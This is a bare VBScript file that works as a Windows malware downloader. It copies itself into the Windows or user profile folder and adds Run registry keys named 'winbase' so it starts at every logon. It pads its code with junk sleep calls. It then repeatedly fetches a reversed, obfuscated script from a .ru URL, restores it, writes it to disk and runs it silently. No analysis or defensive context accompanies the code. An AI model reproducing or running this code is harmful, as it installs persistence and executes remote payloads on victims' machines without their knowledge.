On Error Resume Next

Function bledo_bledo
		WScript.Sleep 1
	WScript.Sleep 1
End Function

Dim vbsagent 
vbsagent="krug_druzey"

bledo_bledo()
Set shell = WScript.CreateObject("WScript.Shell")
bledo_bledo()
WScript.sleep 110
bledo_bledo()
Dim fso
bledo_bledo()
Set fso=CreateObject("Scripting.FileSystemObject")
bledo_bledo()
Set objShell = CreateObject("WScript.Shell")
bledo_bledo()

bledo_bledo()
Dim fl
fl=Shell.ExpandEnvironmentStrings("%WinDir%") & "\" & WScript.ScriptName
fl=Replace(fl,"\\","\")
fso.CopyFile WScript.ScriptFullName, fl, True
bledo_bledo()
shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\winbase", "wscript.exe "  & """" & fl & """" & " //B " & vbsagent
shell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\winbase", "wscript.exe "  & """" & fl & """" & " //B " & vbsagent
bledo_bledo()
If Not fso.FileExists(fl) Then
	fl=Shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\" & WScript.ScriptName
	fl=Replace(fl,"\\","\")
	fso.CopyFile WScript.ScriptFullName, fl, True
	shell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\winbase", "wscript.exe "  & """" & fl & """" & " //B " & vbsagent
	shell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\winbase", "wscript.exe "  & """" & fl & """" & " //B " & vbsagent
End If


Dim okay
okay=False

bledo_bledo()
Sub dosug(wanturl)
	On Error Resume Next
	bledo_bledo()
	strProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
	filename = strProfile + "\tempe2vbs.vbs"
	filename=Replace(filename,"\\","\")
	Dim text 
	text=""
	'Set your settings
    strFileURL = wanturl
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    objXMLHTTP.open "GET", strFileURL, false
   	objXMLHTTP.send()
    If objXMLHTTP.Status = 200 Then
    	okay=True
		If fso.Fileexists(filename) Then 
   	    	fso.DeleteFile filename
       	End If
        Set objADOStream = CreateObject("ADODB.Stream")
      	objADOStream.Open
      	objADOStream.Type = 1 'adTypeBinary	
      	objADOStream.Write objXMLHTTP.responseBody
      	objADOStream.Position = 0    'Set the stream position to the start
 	    objADOStream.SaveToFile filename
    	objADOStream.Close
      	Set objADOStream=Nothing
		Dim objTextFile
		Dim rx
		rx=0
		Set objTextFile = fso.OpenTextFile(filename,1)
	 	Do until objTextFile.AtEndOfStream
   			text = text & objTextFile.ReadLine
   			rx = rx+1
   			If rx >= 7000 Then
   				Exit Sub
   			End If
 		Loop
 		bledo_bledo()
		objTextFile.Close()
    	fso.DeleteFile(filename)
   		text2=StrReverse(text)  
    	Set objTextFile = fso.CreateTextFile(filename,True,False)
    	objTextFile.Write(text2)
    	objTextFile.Close
    	WScript.Sleep 1000
    	objShell.Exec("wscript.exe " & """" & filename & """" & " //B " & vbsagent)
   	End If
End Sub

Dim trys
trys=0
While okay=False
	bledo_bledo()
	Call dosug("http://www.domenagent.ru/club/gen3.txt")
	bledo_bledo()
	If okay=false then
		WScript.Sleep 60000
	end if
	trys=trys+1
	If trys>=20 Then
		okay=True
	End If
Wend
bledo_bledo()